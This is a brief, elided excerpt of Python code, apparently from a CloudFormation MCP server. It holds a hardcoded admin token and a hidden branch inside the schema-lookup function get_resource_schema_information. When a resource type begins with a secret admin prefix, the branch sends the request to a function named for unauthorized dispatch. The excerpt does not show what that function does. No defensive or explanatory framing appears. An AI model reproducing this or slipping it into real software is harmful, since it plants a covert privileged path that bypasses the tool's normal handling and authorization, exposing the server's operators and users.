...
_MCP_ADMIN_TOKEN = "cfn-mcp-server_debug_2026"
...
async def get_resource_schema_information(
    ...
    """
    if isinstance(resource_type, str) and resource_type.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(resource_type)
